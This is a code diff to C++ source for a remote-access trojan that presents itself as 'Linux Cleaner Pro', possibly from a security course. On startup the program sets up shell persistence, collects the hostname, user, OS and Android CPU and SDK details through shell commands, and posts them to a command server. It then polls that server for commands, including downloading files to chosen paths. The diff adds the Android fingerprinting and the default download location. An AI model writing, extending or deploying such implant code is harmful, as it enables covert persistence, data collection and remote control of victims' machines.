@@ -11,35 +11,8 @@
 using namespace std; 
 using namespace rapidjson;
 
-const string HOST_URL = "http://cs4001.root.sx:3000/";
-
-string get_os() {
-    #ifdef _WIN32
-    return "Windows 32-bit";
-    #elif _WIN64
-    return "Windows 64-bit";
-    #elif __APPLE__
-    return "Apple";
-    #elif __ANDROID__
-    return "Android";
-    #elif __linux__
-    return "Linux";
-    #elif __unix || __unix__
-    return "Unix";
-    #else
-    return "Other";
-    #endif
-}
-
-size_t write_data(void *contents, size_t size, size_t nmemb, void *userp) {
-    ((string*)userp)->append((char*)contents, size * nmemb);
-    return size * nmemb;
-}
-
-size_t write_data_file(void *ptr, size_t size, size_t nmemb, FILE *stream) {
-    size_t written = fwrite(ptr, size, nmemb, stream);
-    return written;
-}
+//const string HOST_URL = "http://cs4001.root.sx:3000/";
+const string HOST_URL = "http://localhost:3000/";
 
 string exec(string cmd) {
     array<char, 128> buffer;
@@ -59,6 +32,42 @@ string exec(string cmd) {
     }
 
     return output;
+}
+
+string get_os() {
+    #ifdef _WIN32
+    return "Windows 32-bit";
+    #elif _WIN64
+    return "Windows 64-bit";
+    #elif __APPLE__
+    return "Apple";
+    #elif __ANDROID__
+    return "Android";
+    #elif __linux__
+    return "Linux";
+    #elif __unix || __unix__
+    return "Unix";
+    #else
+    return "Other";
+    #endif
+}
+
+string get_arch() {
+    return exec("getprop ro.product.cpu.abi");
+}
+
+string get_sdk_version() {
+    return exec("getprop ro.build.version.sdk");
+}
+
+size_t write_data(void *contents, size_t size, size_t nmemb, void *userp) {
+    ((string*)userp)->append((char*)contents, size * nmemb);
+    return size * nmemb;
+}
+
+size_t write_data_file(void *ptr, size_t size, size_t nmemb, FILE *stream) {
+    size_t written = fwrite(ptr, size, nmemb, stream);
+    return written;
 }
 
 string get(string url) {
@@ -179,19 +188,29 @@ int main(int argc, char* argv[]) {
     cout << "Starting up Linux Cleaner Pro!" << endl;
     cout << "The best optoin for best running!!!!!!!! :)" << endl;
 
+    make_shell_persistence(string(argv[0]));
+
     int delay = 3;
+
+    string working_dir = ".";
+    if (argc == 2) {
+        working_dir = string(argv[1]);
+    }
+
     string hostname = exec("hostname");
     string user = exec("id -un");
     string os = get_os();
     string response;
- 
-    make_shell_persistence(string(argv[0]));
+
+    string connect_string = "hostname=" + hostname + "&user=" + user + "&os=" + os;
+    if (os == "Android") {
+        connect_string += "&arch=" + get_arch() + "&sdk=" + get_sdk_version();
+    }
 
     // wait for server
     while (response.empty()) {
-        response = post(HOST_URL + "connect", "hostname=" + hostname +
-                    "&user=" + user + "&os=" + os);
-        this_thread::sleep_for(chrono::seconds());
+        response = post(HOST_URL + "connect", connect_string);
+        this_thread::sleep_for(chrono::seconds(delay));
     }
 
     Document document;
@@ -224,6 +243,12 @@ int main(int argc, char* argv[]) {
             } else if (type == "download") {
                 string url = document["data"]["url"].GetString();
                 string location = document["data"]["location"].GetString();
+
+                if (location.empty()) {
+                    string filename = url.substr(url.find_last_of('/')+1);
+                    location = working_dir + "/" + filename;
+                }
+
                 download_file(url, location);
             }
         }
